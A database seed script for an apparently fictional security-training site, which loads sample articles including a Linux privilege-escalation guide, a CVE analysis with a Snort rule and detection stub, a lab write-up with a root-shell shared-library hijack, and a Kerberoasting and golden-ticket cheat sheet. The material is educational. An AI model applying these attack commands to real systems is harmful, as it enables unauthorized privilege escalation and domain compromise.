import { PrismaClient } from "@prisma/client";
import bcrypt from "bcryptjs";

const prisma = new PrismaClient();

async function main() {
  console.log("Seeding CyberVault platform data...");

  // 1. Create Administrator & Author Accounts
  const adminPasswordHash = await bcrypt.hash("AdminCyberVault2026!", 12);
  const authorPasswordHash = await bcrypt.hash("AuthorCyberVault2026!", 12);

  const admin = await prisma.user.upsert({
    where: { email: "admin@cybervault.local" },
    update: {},
    create: {
      email: "admin@cybervault.local",
      name: "CyberVault SecOps",
      passwordHash: adminPasswordHash,
      role: "ADMIN",
      bio: "Principal Security Researcher and Platform Administrator.",
      profile: {
        create: {
          website: "https://cybervault.local",
          github: "https://github.com/cybervault",
          twitter: "https://x.com/cybervault_sec",
          interests: "Kernel exploitation, Active Directory, Threat Intelligence, Detection Engineering",
        },
      },
    },
  });

  const author = await prisma.user.upsert({
    where: { email: "author@cybervault.local" },
    update: {},
    create: {
      email: "author@cybervault.local",
      name: "Alex Vance, OSCP",
      passwordHash: authorPasswordHash,
      role: "AUTHOR",
      bio: "Red Team Operator and Penetration Tester specializing in internal network compromise.",
      profile: {
        create: {
          website: "https://vance-sec.net",
          github: "https://github.com/vance-sec",
          interests: "Offensive Security, HTB, Active Directory, Web App Security",
        },
      },
    },
  });

  // 2. Categories
  const categoriesData = [
    { name: "Vulnerability Research", slug: "vulnerability-research", description: "In-depth CVE dissections, memory corruption, and PoC reverse engineering.", icon: "ShieldAlert" },
    { name: "Tutorials & Guides", slug: "tutorials", description: "Comprehensive, step-by-step offensive and defensive security walkthroughs.", icon: "BookOpen" },
    { name: "Offensive Security", slug: "offensive-security", description: "Penetration testing methodologies, privilege escalation, and lateral movement.", icon: "Terminal" },
    { name: "Defensive Security", slug: "defensive-security", description: "Blue team defense, SIEM hunting, threat modeling, and hardening guides.", icon: "ShieldCheck" },
    { name: "Lab Write-ups", slug: "write-ups", description: "Structured walkthroughs for Hack The Box, TryHackMe, and CTF challenges.", icon: "Flag" },
    { name: "Threat Intelligence", slug: "threat-intel", description: "Analysis of emerging threat actor TTPs, malware campaigns, and advisories.", icon: "Radio" },
  ];

  for (const cat of categoriesData) {
    await prisma.category.upsert({
      where: { slug: cat.slug },
      update: {},
      create: cat,
    });
  }

  // 3. Tags
  const tagsData = [
    { name: "CVE Analysis", slug: "cve" },
    { name: "Linux", slug: "linux" },
    { name: "Active Directory", slug: "active-directory" },
    { name: "Privilege Escalation", slug: "privilege-escalation" },
    { name: "Web Security", slug: "web-security" },
    { name: "Reverse Engineering", slug: "reverse-engineering" },
    { name: "Hack The Box", slug: "hack-the-box" },
    { name: "Forensics", slug: "forensics" },
  ];

  for (const t of tagsData) {
    await prisma.tag.upsert({
      where: { slug: t.slug },
      update: {},
      create: t,
    });
  }

  const catResearch = await prisma.category.findUnique({ where: { slug: "vulnerability-research" } });
  const catTutorials = await prisma.category.findUnique({ where: { slug: "tutorials" } });
  const catOffensive = await prisma.category.findUnique({ where: { slug: "offensive-security" } });

  const tagLinux = await prisma.tag.findUnique({ where: { slug: "linux" } });
  const tagPrivesc = await prisma.tag.findUnique({ where: { slug: "privilege-escalation" } });
  const tagAD = await prisma.tag.findUnique({ where: { slug: "active-directory" } });
  const tagCVE = await prisma.tag.findUnique({ where: { slug: "cve" } });

  // 4. Seed Articles
  const article1 = await prisma.article.upsert({
    where: { slug: "linux-enumeration-and-privilege-escalation" },
    update: {},
    create: {
      title: "Linux Enumeration Fundamentals: From Foothold to Root",
      slug: "linux-enumeration-and-privilege-escalation",
      subtitle: "A systematic red team methodology for auditing Linux systems and identifying misconfigurations.",
      summary: "Explore tactical Linux local enumeration commands, automated auditing tools, SUID binary exploitation, and kernel attack vectors.",
      authorId: admin.id,
      categoryId: catOffensive?.id,
      status: "PUBLISHED",
      visibility: "PUBLIC",
      isFeatured: true,
      readingTimeMinutes: 9,
      publishedAt: new Date("2026-03-15"),
      content: `---
title: Linux Enumeration Fundamentals: From Foothold to Root
category: Offensive Security
tags: [linux, privilege-escalation, methodology]
status: published
---

# Linux Enumeration Fundamentals

Acquiring a low-privilege foothold on a target Linux host is only the preliminary phase of an engagement. Systematic local enumeration represents the differentiator between a stalled assessment and successful elevation to root privilege.

> [!NOTE]
> All commands and techniques documented here are intended strictly for authorized security assessments, CTF practice environments, and defense verification.

## 1. Initial System Profiling

Upon landing inside a restricted shell, immediate environmental reconnaissance establishes target boundaries:

\`\`\`bash
# Identify OS release and kernel build architecture
uname -a
cat /etc/os-release
hostname
\`\`\`

Review available path variables and current session identifiers:

\`\`\`bash
id
whoami
echo $PATH
\`\`\`

## 2. Process and Sudo Privileges

Inspect the sudo policy assigned to the active user account:

\`\`\`bash
sudo -l
\`\`\`

> [!WARNING]
> If \`sudo -l\` lists binaries configured with \`NOPASSWD:\`, cross-reference GTFOBins immediately for instantaneous privilege escalation vectors.

### Inspecting Running Processes

Inspect internal daemon bindings listening exclusively on \`127.0.0.1\`:

\`\`\`bash
ss -tulpn | grep 127.0.0.1
\`\`\`

## 3. Dangerous SUID and GUID Binaries

SUID binaries execute under the effective UID of the file owner (typically root):

\`\`\`bash
find / -perm -u=s -type f 2>/dev/null
\`\`\`

Common high-risk misconfigured binaries:
- \`/usr/bin/find\`
- \`/usr/bin/vim\`
- \`/usr/bin/python3\`
- Custom internal binaries compiled with executable stack or improper dynamic linking.

## 4. Cron Jobs and Scheduled Tasks

Audit system-wide cron tab definitions and spool directories:

\`\`\`bash
cat /etc/crontab
ls -la /etc/cron.*
\`\`\`

> [!TIP]
> Use tools like \`pspy\` to monitor unprivileged cron execution in real time without root permissions.

## Summary Checklist
- [x] Check Kernel Version & Distro
- [x] Audit Sudo Permissions (\`sudo -l\`)
- [x] Search SUID / SGID Binaries
- [x] Inspect Writable PATH Directories
- [x] Review Local Services & Database Sockets
`,
    },
  });

  if (tagLinux && tagPrivesc) {
    await prisma.articleTag.upsert({
      where: { articleId_tagId: { articleId: article1.id, tagId: tagLinux.id } },
      update: {},
      create: { articleId: article1.id, tagId: tagLinux.id },
    });
    await prisma.articleTag.upsert({
      where: { articleId_tagId: { articleId: article1.id, tagId: tagPrivesc.id } },
      update: {},
      create: { articleId: article1.id, tagId: tagPrivesc.id },
    });
  }

  // Article 2: Understanding CVE and CVSS
  const article2 = await prisma.article.upsert({
    where: { slug: "understanding-cve-and-cvss-vulnerability-scoring" },
    update: {},
    create: {
      title: "Understanding CVE and CVSS: Modern Vulnerability Analysis",
      slug: "understanding-cve-and-cvss-vulnerability-scoring",
      subtitle: "Deconstructing Common Vulnerability Scoring System metrics, exploitability indicators, and real-world triage.",
      summary: "A technical guide to navigating the Common Vulnerabilities and Exposures framework and interpreting CVSS v3.1 / v4.0 vector strings.",
      authorId: admin.id,
      categoryId: catResearch?.id,
      status: "PUBLISHED",
      visibility: "PUBLIC",
      isFeatured: true,
      readingTimeMinutes: 7,
      publishedAt: new Date("2026-03-20"),
      content: `---
title: Understanding CVE and CVSS: Modern Vulnerability Analysis
category: Vulnerability Research
tags: [cve, research, methodology]
status: published
---

# Understanding CVE & CVSS Analysis

Vulnerability triage requires understanding the mathematical and tactical taxonomy governing Common Vulnerabilities and Exposures (CVE) and the Common Vulnerability Scoring System (CVSS).

> [!IMPORTANT]
> A raw CVSS Base Score of 9.8 does not automatically guarantee weaponized reliability in your environment. Always analyze the full vector string and exploitation prerequisites.

## The Anatomy of a CVSS v3.1 Vector String

Consider the benchmark critical vector:
\`CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H\`

| Metric | Code | Interpretation |
| :--- | :--- | :--- |
| **Attack Vector** | \`AV:N\` | Network routable without physical/local access |
| **Attack Complexity** | \`AC:L\` | Low complexity; no race condition or specialized layout |
| **Privileges Required** | \`PR:N\` | Unauthenticated; attacker needs no valid credentials |
| **User Interaction** | \`UI:N\` | Zero victim interaction needed |
| **Scope** | \`S:U\` | Unchanged; vulnerability impact confined to component |
| **Impact (CIA)** | \`C:H/I:H/A:H\` | Total loss of Confidentiality, Integrity, and Availability |

## CISA Known Exploited Vulnerabilities (KEV)

Modern vulnerability prioritization focuses heavily on verified real-world weaponization:

\`\`\`bash
# Querying CISA KEV JSON catalog programmatically
curl -s https://www.cisa.gov/sites/default/files/feeds/known_exploited_vulnerabilities.json | jq '.vulnerabilities[:3]'
\`\`\`

## Responsible Vulnerability Disclosure Steps
1. **Verification**: Reproduce the condition in an isolated laboratory environment.
2. **Vendor Contact**: Notify the security response team via encrypted channels (PGP).
3. **Remediation Period**: Provide standard 90-day grace period for coordinated patch authoring.
4. **Advisory Publication**: Release coordinated public technical analysis.
`,
    },
  });

  if (tagCVE) {
    await prisma.articleTag.upsert({
      where: { articleId_tagId: { articleId: article2.id, tagId: tagCVE.id } },
      update: {},
      create: { articleId: article2.id, tagId: tagCVE.id },
    });
  }

  // 5. Seed CVE Record
  await prisma.cVERecord.upsert({
    where: { cveId: "CVE-2026-1001" },
    update: {},
    create: {
      cveId: "CVE-2026-1001",
      title: "Remote Code Execution via Insecure Deserialization in Enterprise Core Gateway",
      summary: "Unauthenticated remote attackers can execute arbitrary system commands by supplying crafted binary payloads to the management API endpoint.",
      technicalDescription: "An insecure object deserialization vulnerability exists in Enterprise Core Gateway versions prior to 4.2.1. When handling serialized session state headers, the API daemon invokes an unsafe object loader without type verification.",
      affectedProducts: "Enterprise Core Gateway, Gateway Management Suite",
      affectedVersions: "3.8.0 through 4.2.0",
      fixedVersions: "4.2.1",
      cvssScore: 9.8,
      cvssVector: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
      severity: "CRITICAL",
      cweId: "CWE-502: Deserialization of Untrusted Data",
      vendorAdvisoryUrl: "https://advisories.cybervault.local/2026/ecg-001",
      nvdUrl: "https://nvd.nist.gov/vuln/detail/CVE-2026-1001",
      patchAvailable: true,
      knownExploited: false,
      detectionRules: "alert tcp $EXTERNAL_NET any -> $HOME_NET 8443 (msg:\"CYBERVAULT ECG Insecure Deserialization Probe\"; content:\"|ac ed 00 05|\"; sid:9001001; rev:1;)",
      mitigation: "Upgrade immediately to version 4.2.1. If patching cannot be performed immediately, block external network access to port 8443 via perimeter firewalls.",
      analysisContent: `## Deep Dive Technical Analysis

The flaw originates in the HTTP header handler for \`X-Gateway-Session-State\`. The controller decodes base64 payload bytes and pipes them directly into the standard object stream deserializer.

\`\`\`python
# Proof of Concept Detection Stub (Testing Environment Only)
import requests

target = "https://target-gateway.local:8443/api/v1/health"
headers = {
    "User-Agent": "CyberVault-Audit-Scanner/1.0",
    "X-Gateway-Session-State": "rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAU="
}

response = requests.get(target, headers=headers, verify=False)
if "DeserializationError" in response.text:
    print("[!] Target system is vulnerable to CVE-2026-1001")
\`\`\`
`,
      authorId: admin.id,
      isPublished: true,
    },
  });

  // 6. Seed Write-Up
  await prisma.writeUp.upsert({
    where: { slug: "hackthebox-cybervault-lab01" },
    update: {},
    create: {
      title: "Hack The Box: CyberVault-Lab01 (Medium) Walkthrough",
      slug: "hackthebox-cybervault-lab01",
      platform: "HACKTHEBOX",
      machineName: "CyberVault-Lab01",
      difficulty: "MEDIUM",
      os: "LINUX",
      skillsRequired: "Port Scanning, Directory Brute Forcing, SQL Injection, SUID Binary Exploitation",
      skillsLearned: "Out-of-Band Data Exfiltration, Linux Shared Object Hijacking",
      overview: "CyberVault-Lab01 is a medium Linux box featuring an exposed internal monitoring dashboard, blind time-based SQL injection, and a custom cron binary vulnerable to dynamic library hijacking.",
      spoilerProtection: true,
      authorId: author.id,
      status: "PUBLISHED",
      isFeatured: true,
      content: `## 1. Scope & Reconnaissance

Initial network probe against target IP \`10.10.11.45\`:

\`\`\`bash
nmap -sC -sV -p- -T4 -oN nmap_initial.txt 10.10.11.45
\`\`\`

Open ports identified:
- **Port 22**: OpenSSH 8.9p1 (Ubuntu)
- **Port 80**: Apache httpd 2.4.52
- **Port 8080**: Node.js Internal Metric Service

## 2. Web Enumeration & Initial Access

Navigating to port 80 reveals an asset management portal. Testing the search query parameter:

\`\`\`bash
sqlmap -u "http://10.10.11.45/assets?query=test" --batch --dbs
\`\`\`

The query was vulnerable to Boolean-based Blind SQL Injection. Extracting the \`users\` table yields an administrative password hash. Cracking with hashcat:

\`\`\`bash
hashcat -m 3200 hash.txt /usr/share/wordlists/rockyou.txt
\`\`\`

## 3. User Flag

SSH credentials authenticated for user \`developer\`. User flag captured in home directory.

## 4. Privilege Escalation

Inspecting writable paths revealed a custom backup script executing under root cron:

\`\`\`bash
ls -la /opt/scripts/backup.sh
\`\`\`

The backup executable dynamically loaded a missing shared object \`libcustom_audit.so\`. Compiling a local shared library with an initialization hook spawned a root shell:

\`\`\`c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

void __attribute__((constructor)) init() {
    setuid(0);
    setgid(0);
    system("/bin/bash -p");
}
\`\`\`
`,
    },
  });

  // 7. Seed Knowledge Base Document
  await prisma.knowledgeDocument.upsert({
    where: { slug: "active-directory-kerberos-cheat-sheet" },
    update: {},
    create: {
      title: "Active Directory Kerberos Attacks Cheat Sheet",
      slug: "active-directory-kerberos-cheat-sheet",
      folder: "Active Directory",
      category: "Cheat Sheets",
      visibility: "PUBLIC",
      isFavorite: true,
      authorId: admin.id,
      content: `# Active Directory Kerberos Cheat Sheet

## 1. Kerberoasting
Request TGS tickets for Service Principal Names (SPNs) associated with user accounts:

\`\`\`bash
# Using Impacket GetUserSPNs
impacket-GetUserSPNs domain.local/user:password -dc-ip 10.10.10.10 -request -outputfile hashes.kerberoast
\`\`\`

Cracking the resulting RC4 / AES tickets:
\`\`\`bash
hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt
\`\`\`

## 2. AS-REP Roasting
Target accounts configured with \`DONT_REQ_PREAUTH\` (Do not require Kerberos preauthentication):

\`\`\`bash
impacket-GetNPUsers domain.local/ -usersfile users.txt -no-pass -dc-ip 10.10.10.10 -format hashcat -outputfile asrep.txt
hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt
\`\`\`

## 3. Golden Ticket Creation
Requires Domain SID and KRBTGT NTLM hash:

\`\`\`bash
impacket-ticketer -nthash <KRBTGT_HASH> -domain-sid S-1-5-21-... -domain domain.local Administrator
export KRB5CCNAME=Administrator.ccache
\`\`\`
`,
    },
  });

  // 8. Seed Community Discussion
  await prisma.discussion.upsert({
    where: { slug: "offensive-security-oscp-2026-strategy-and-labs" },
    update: {},
    create: {
      title: "2026 Offensive Security (OSCP/PEN-200) Strategy and Lab Preparation",
      slug: "offensive-security-oscp-2026-strategy-and-labs",
      category: "CAREER",
      authorId: author.id,
      content: "Let's discuss effective lab methodologies for tackling the 2026 PEN-200 syllabus. Which HTB Pro Labs or PG Practice machines provided the most realistic Active Directory lateral movement practice for you?",
      replies: {
        create: [
          {
            authorId: admin.id,
            content: "Focus heavily on pivoting through multiple subnets using Chisel and Ligolo-ng. Active Directory sets today prioritize realistic Kerberos delegation and certificate service misconfigurations (ADCS).",
            isAcceptedAnswer: true,
          },
        ],
      },
    },
  });

  console.log("Database seeded successfully!");
}

main()
  .catch((e) => {
    console.error("Error during seeding:", e);
    process.exit(1);
  })
  .finally(async () => {
    await prisma.$disconnect();
  });
